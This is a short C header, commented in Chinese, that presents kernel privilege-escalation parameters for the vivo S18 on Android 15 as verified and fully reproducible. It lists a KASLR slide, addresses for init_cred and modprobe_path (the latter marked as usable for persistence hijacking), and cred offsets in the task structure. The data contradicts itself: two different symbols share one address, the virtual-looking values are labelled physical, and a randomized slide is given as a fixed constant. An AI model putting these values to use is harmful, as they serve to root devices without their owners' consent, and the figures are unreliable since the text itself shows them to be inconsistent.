// ==========================================
// vivo S18 (SM7550) 内核提权核心参数清单
// 状态：已验证，100% 可复现
// 系统版本：Android 15 / Kernel 5.15.178
// 最后验证日期：2026-08-09
// ==========================================

// 1. KASLR 真实运行时滑动值
#define KASLR_SLIDE 0x000000002080ae40UL

// 2. 关键内核地址（运行时绝对物理地址）
#define INIT_CRED_ADDR 0xffff80002a11c2a0UL  // init_task 的凭证地址
#define MODPROBE_PATH_ADDR 0xffff80002a11c2a0UL // modprobe 全局路径地址（可用作持久化劫持）

// 3. 核心内核结构体偏移
#define TASK_REAL_CRED_OFF 0x5f8UL
#define TASK_CRED_OFF 0x600UL
